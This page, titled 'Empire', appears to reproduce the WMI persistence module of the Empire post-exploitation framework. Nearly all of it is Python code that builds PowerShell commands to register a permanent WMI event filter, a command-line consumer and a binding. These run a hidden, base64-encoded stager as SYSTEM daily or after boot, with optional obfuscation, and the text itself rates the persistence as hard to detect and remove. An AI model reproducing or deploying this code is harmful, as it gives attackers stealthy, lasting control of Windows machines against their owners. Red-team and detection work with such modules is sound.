<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Empire</title>
</head><body>Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating<br/>
<br/>
It adds a permanent WMI subscription either at a DailyTime or within 5 minutes of system boot with AtStartup. This will run as SYSTEM, regardless of whether a user has logged in or not.<br/>
<br/>
<br/>
<br/>
# built the command that will be triggered<br/>
    triggerCmd = &quot;$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc &quot; + encScript<br/>
    <br/>
    if dailyTime != '':<br/>
      <br/>
      parts = dailyTime.split(&quot;:&quot;)<br/>
      <br/>
      if len(parts) &lt; 2:<br/>
        print helpers.color(&quot;[!] Please use HH:mm format for DailyTime&quot;)<br/>
        return &quot;&quot;<br/>
<br/>
      hour = parts[0]<br/>
      minutes = parts[1]<br/>
<br/>
      # create the WMI event filter for a system time<br/>
      script = &quot;$Filter=Set-WmiInstance -Class __EventFilter -Namespace \&quot;root\\subscription\&quot; -Arguments @{name='&quot;+subName+&quot;';EventNameSpace='root\CimV2';QueryLanguage=\&quot;WQL\&quot;;Query=\&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = &quot;+hour+&quot; AND TargetInstance.Minute= &quot;+minutes+&quot; GROUP WITHIN 60\&quot;};&quot;<br/>
      statusMsg += &quot; WMI subscription daily trigger at &quot; + dailyTime + &quot;.&quot;<br/>
<br/>
    else:<br/>
      # create the WMI event filter for OnStartup<br/>
      script = &quot;$Filter=Set-WmiInstance -Class __EventFilter -Namespace \&quot;root\\subscription\&quot; -Arguments @{name='&quot;+subName+&quot;';EventNameSpace='root\CimV2';QueryLanguage=\&quot;WQL\&quot;;Query=\&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\&quot;};&quot;<br/>
      statusMsg += &quot; with OnStartup WMI subsubscription trigger.&quot;<br/>
<br/>
<br/>
    # add in the event consumer to launch the encrypted script contents<br/>
    script += &quot;$Consumer=Set-WmiInstance -Namespace \&quot;root\\subscription\&quot; -Class 'CommandLineEventConsumer' -Arguments @{ name='&quot;+subName+&quot;';CommandLineTemplate=\&quot;&quot;+triggerCmd+&quot;\&quot;;RunInteractively='false'};&quot;<br/>
<br/>
    # bind the filter and event consumer together<br/>
    script += &quot;Set-WmiInstance -Namespace \&quot;root\subscription\&quot; -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;&quot;<br/>
<br/>
<br/>
    script += &quot;'WMI persistence established &quot;+statusMsg+&quot;'&quot;<br/>
    if obfuscate:<br/>
      script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)<br/>
    return script</body></html>